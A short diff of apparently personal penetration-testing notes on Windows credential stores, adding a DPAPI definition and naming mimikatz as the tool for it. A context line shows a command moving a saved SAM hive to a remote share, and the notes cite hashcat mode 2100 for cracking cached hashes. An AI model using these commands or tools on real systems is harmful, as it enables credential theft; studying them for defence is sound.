@@ -46,5 +46,6 @@ move sam.save \\<hoost ip>\SHARENAME
 				-> username as salt
 				-> 32-char hex digest
 				-> hashcat mode 2100
-		-> Data Protection API (DPAPI)- 
+		-> Data Protection API (DPAPI)- A set of APIs used encrypt and decrypt data blobs(creds) on a per-user basis.
+			-> `mimikatz`
 	- `C:\Windows\System32\config\SECURITY `
